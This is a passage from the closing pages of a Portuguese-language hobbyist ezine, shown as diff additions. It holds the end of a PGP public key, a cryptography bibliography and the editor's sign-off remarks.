+XBr8c67eod+TUKG/R0QSxACEKdvixQLO6E7UQi2p0vQXs5a2OQmfRg0RG4Fc5UKe
+HWqDW3XVCGMSYnlPX51MMSMczc2u3mIhzOnmx70zDiZj78TO6zokaNx5/Um4tJE6
+5noKcJix
+=sLtX
+-----END PGP PUBLIC KEY BLOCK-----						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+   		 ### Considerações finais e Bibliografia ###
+
+Para a Materia PGP - Criptografia, foi usada como referencia o arquivo:
+PGP(tm) User's Guide - Volume I: Essential Topics em .doc, que tambem pode
+ser encontrado em portugues pela net:
+- Tradução de ROBERTA PAIVA BORTOLOTTI   <roberta@nimitz.ibilce.unesp.br>
+- Revisao de Adriano Mauro Cansian       <adriano@nimitz.ibilce.unesp.br>
+
+Outras Publicações sobre o assunto (se tiverem a oportunidade de ler):
+
+	Bruce Schneier, "Applied Cryptography: Protocols, Algorithms, and
+Source Code in C", John Wiley & Sons, 1993.
+(Este livro e' um trabalho inicial sobre o assunto)
+	Dorothy Denning, "Cryptography and Data Security", Addison-Wesley,
+Reading, MA 1992.
+	Dorothy Denning, "Protecting Public Keys and Signature Keys", IEEE
+Computer, Fevereiro de 1993.
+	Martin E. Hellman, "The Mathematics of Public-Key Cryptography",
+Scientific American, Agosto de 1979.
+	Steven Levy, "Crypto Rebels", WIRED, maio/junho de 1993, pagina 54.
+(Este e' um artigo essencial sobre o PGP e outro topicos relacionados.)
+	Ronald Rivest, "The MD5 Message Digest Algorithm", Laboratorio do MIT
+da Ciencia da Computacao, 1991.
+	Xuejia Lai, "On the Design and Security of Block Ciphers", Series ETH
+sobre Processamento de Informacao (Ed. J. L. Massey), vol.1,
+Hartung-Gorre Verlag, Konstanz, Suica, 1992.
+	Philip Zimmermann, "A Proposed Standard Format for RSA Cryptosystems",
+Avancos na Seguranca de Computadores, vol III, editado por Rein Turn,
+Artech House, 1988.
+	Paul Wallich, "Eletronic Envelopes", Scientific American, fevereiro de
+1993, pagina 30. (Este e' um artigo sobre o PGP)
+	William Bulkeley, "Cipher Probe", Wall Street Journal, 28 de abril de
+1994, primeira pagina. (Este e' um artigo sobre o PGP e Zimmermann)
+
+Outras bibliografias: -------------------------------------------------------
+
+	Mario Valente, "MiniLinux", Esoterica, mvalente@esoterica.com, 1995
+	Steve Jackson, "Gurps Cyberpunk", Steve Jackson Games, 1990
+
+Ultimas palavras: -----------------------------------------------------------
+
+	Bom aqui está a edição 4, espero que tenham gostado... mandem mails
+dizendo como está o zine... mas lembre-se se for criticar, faça algo melhor
+antes :-)
+	Se não conseguir pegar os outros ezines no site que fica na geocities
+então tente na nova homepage, que está no cabeçalho do ezine.
+	A proposito, numa edição eu falei do shell na cyberspace, antes o
+host era ftp.cyberspace.org, mas mudou e hoje é cyberspace.org
+							- Silver-Ba -
+
+################ Aperte as teclas ALT + F4 para continuar... ################
